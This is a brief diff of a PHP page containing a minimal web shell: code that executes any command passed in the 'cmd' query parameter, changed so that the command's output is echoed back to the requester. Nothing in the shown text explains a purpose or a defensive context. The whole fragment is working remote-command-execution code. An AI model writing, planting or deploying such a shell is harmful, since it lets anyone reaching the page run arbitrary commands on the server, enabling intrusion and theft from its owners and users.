@@ -8,7 +8,7 @@
 <?php
     if(isset($_GET['cmd']))
     {
-        exec($_GET['cmd']);
+        echo exec($_GET['cmd']);
     }
 ?>
 </pre>
